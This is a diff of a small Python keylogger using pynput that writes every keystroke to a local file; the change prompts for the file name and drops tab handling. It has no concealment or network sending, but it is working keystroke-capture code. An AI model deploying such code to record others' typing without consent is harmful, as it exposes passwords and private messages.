@@ -1,19 +1,26 @@
 from pynput import keyboard
 import os
 
-file_path = "keyfile.txt"
+file_path = "" 
+
+
+def get_file_path():
+    filename = input("Enter file name: ").strip()
+    if not filename:
+        filename = "text.txt"  
+    return filename
+
 
 def write_to_file(content, mode="a"):
     with open(file_path, mode) as file:
         file.write(content)
+
 
 def handle_special_key(key):
     if key == keyboard.Key.space:
         write_to_file(' ')
     elif key == keyboard.Key.enter:
         write_to_file('\n')
-    elif key == keyboard.Key.tab:
-        write_to_file('\t')
     elif key == keyboard.Key.backspace:
         try:
             with open(file_path, "rb+") as file:
@@ -25,6 +32,7 @@ def handle_special_key(key):
             print(f"Error input: {e}")
     else:
         write_to_file(f'[{key}]')
+
 
 def keyPressed(key):
     print(str(key))
@@ -41,6 +49,8 @@ def keyPressed(key):
     except Exception as e:
         print(f"Error: {e}")
 
+
 if __name__ == "__main__":
+    file_path = get_file_path()
     with keyboard.Listener(on_press=keyPressed) as listener:
         listener.join()
